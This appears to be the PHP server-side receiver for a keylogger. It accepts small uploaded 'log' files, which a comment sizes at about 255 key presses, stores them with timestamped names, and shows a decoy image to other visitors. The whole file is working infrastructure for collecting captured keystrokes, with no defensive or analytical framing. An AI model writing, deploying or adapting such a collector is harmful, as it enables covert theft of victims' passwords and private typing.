<?php
require_once('include.php');

// make sure a POST request is coming in
$req_method = $_SERVER['REQUEST_METHOD'];
if (strcmp($req_method, 'POST') != 0 || !isset($_FILES['log']))
{
   // header('Location: http://www.google.com', true);
    echo "<center><img src='http://i.imgur.com/DhIBQX8.jpg'/></center>";
    exit;
}


// grab uploaded file name
$name = $_FILES['log']['tmp_name'];

// make sure there is a 'log' file being uploaded
if (!is_uploaded_file($name))
{
    echo "Invalid file!";
    exit;
}

// grab info of file we are uplaoding (log in this case)
$errors = $_FILES['log']['error'];
if (!$errors)
{
    // no errors, get rest of info
    $size = $_FILES['log']['size'];

    // make sure file is not bigger than 500 bytes (255 key presses per log) and it is not empty!
    if ($size > 500 || $size <= 0)
    {
        echo "FILE TOO BIG OR EMPTY! " . $size . " BYTE(S)";
        exit;
    }

    // give the file a unique name base on the current date
    $unique_name = 'log_' . date('YmdHis');

    // move file to logs folder
    if (move_uploaded_file($name, "logs/$unique_name"))
        echo " ";
}

?>
